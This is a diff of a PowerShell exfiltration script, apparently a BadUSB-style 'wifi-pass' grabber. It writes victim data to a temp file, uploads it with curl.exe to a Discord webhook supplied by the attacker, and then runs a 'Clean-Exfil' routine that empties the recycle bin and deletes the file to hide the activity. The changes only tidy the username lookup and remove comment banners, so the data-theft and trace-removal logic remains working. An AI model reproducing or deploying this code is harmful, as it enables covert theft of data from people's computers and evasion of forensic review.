@@ -1,11 +1,5 @@
-############################################################################################################################################################
-
-$wifiProfiles = "Привет, $env:username"
-
-
-$wifiProfiles > $env:TEMP/--wifi-pass.txt
-
-############################################################################################################################################################
+$wifiProfiles = "Привет, $($env:USERPROFILE.split('\')[-1])"
+$wifiProfiles | Out-File $env:TEMP/--wifi-pass.txt
 
 function Upload-Discord {
 
@@ -20,7 +14,7 @@ param (
 $hookurl = "$dc"
 
 $Body = @{
-  'username' = $env:username
+  'username' = $($env:USERPROFILE.split('\')[-1])
   'content' = $text
 }
 
@@ -31,10 +25,6 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}
-
- 
-
-############################################################################################################################################################
 
 function Clean-Exfil { 
 
@@ -52,9 +42,6 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 }
 
-############################################################################################################################################################
-
 if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 
-
-RI $env:TEMP/--wifi-pass.txt
+Remove-Item $env:TEMP/--wifi-pass.txt
